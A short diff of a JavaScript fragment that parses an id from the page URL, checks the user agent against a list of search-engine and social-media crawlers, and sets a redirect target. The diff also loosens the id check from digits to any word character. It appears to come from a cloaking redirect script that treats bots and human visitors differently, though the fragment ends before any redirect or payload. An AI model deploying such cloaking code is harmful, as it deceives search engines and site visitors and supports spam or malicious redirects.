@@ -1,5 +1,5 @@
 let url = window['location']['href'], id = url['substring'](url['lastIndexOf']('=') + 1), explode = url['split']('/'), subdom = explode[2];
-if (id['match'](/^[0-9]+$/) != null) {
+if (id['match'](/\w/) != null) {
     let user_agent = navigator['userAgent'],
     filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
     redirect_link = 'https://google.com';
